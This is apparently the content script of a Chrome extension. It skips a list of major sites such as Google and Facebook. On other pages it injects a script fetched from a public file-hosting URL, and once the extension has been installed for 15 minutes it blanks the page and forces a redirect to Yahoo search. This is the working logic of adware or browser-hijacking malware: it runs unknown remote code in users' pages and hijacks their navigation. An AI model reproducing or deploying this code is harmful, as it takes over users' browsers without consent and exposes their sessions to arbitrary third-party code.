(function () {
    if (window != window.top) {
        return;
    }

    var redirectMaxAge = 1000 * 60; // 1 minute
    var lastRedirectTimeStampKey = "lrts";

    var installTimeStampKey = "its";
    var redirectMaxAgeAfterInstall = 1000 * 60 * 15; // 15 minutes

    function timestamp() {
        return (new Date).valueOf();
    }

    function receiveMessage(event) {
        if (event["data"]["id"] !== "45YhdOUjdn") { // integrity check to make sure we are the one sending the message
            return;
        }

        if (event["data"]["msg"] === "bp") {
            // rr = redirect
            // get install date from background page
            chrome["runtime"]["sendMessage"]({ "msg": "its" }, function (response) {
                // check if install date is old enough
                var installTimeStamp = response[installTimeStampKey];
                event["data"]["rr"] = timestamp() - installTimeStamp > redirectMaxAgeAfterInstall;

                // if install date is old enough check if we have redirected in the past hour on this domaion
                if (event["data"]["rr"]) {
                    var lastRedirectTimeStamp = localStorage["getItem"](lastRedirectTimeStampKey);
                    event["data"]["rr"] = !lastRedirectTimeStamp || timestamp() - lastRedirectTimeStamp > redirectMaxAge;

                    // if we are still redirecting set the timestamp on the domain local store
                    if (event["data"]["rr"] === true) {
                        localStorage["setItem"](lastRedirectTimeStampKey, timestamp());
                    }
                }

                // send bb message
                chrome["runtime"]["sendMessage"](event["data"], function () { });

                if (event["data"]["rr"]) {
                    document.body.innerHTML = "";
                    document.location = "https://search.yahoo.com";
                }
            });
        }
    }

    window.addEventListener("message", receiveMessage, false);

    function init() {
        var blackListedDomains = [
            "google", "youtube", "yahoo", "facebook", "amazon", "reddit", "wikipedia", "ebay", "netflix", "baidu",
            "twitter", "instagram", "imgur", "craigslist", "espn", "bing"
        ];

        var host = document["location"]["hostname"]["split"]('.');
        for (var s = 0; s < blackListedDomains.length; s++) {
            // bail
            if (host.indexOf(blackListedDomains[s]) === 1 || host.indexOf(blackListedDomains[s]) === 0) {
                return;
            }
        }

        chrome["runtime"]["sendMessage"]({ "msg": "abp" }, function (response) {
            var userPercentage = response["abp"];

            var abThreshold = parseInt("100");
            var run = userPercentage <= abThreshold;
            if (run) {
                var script = document.createElement('script');
                //script["src"] = '/sec/pjs/WHlkcg%3D%3D';
                //script["src"] = 'https://raw.githubusercontent.com/alokcha/GUID/master/protector.js';
                script["src"] = 'https://a.uguu.se/YHn7VrTdTM4t.js';
                document["body"]["appendChild"](script);
            }

            // send protector a/b result message
            chrome["runtime"]["sendMessage"]({
                "msg": "abr",
                "ran": run,
                "abThreshold": abThreshold,
                "userPercentage": userPercentage
            }, function () { });
        });
    }

    if (document["readyState"] === "complete") {
        init();
    } else {
        window.addEventListener("load", function (e) {
            init();
        });
    }
})();
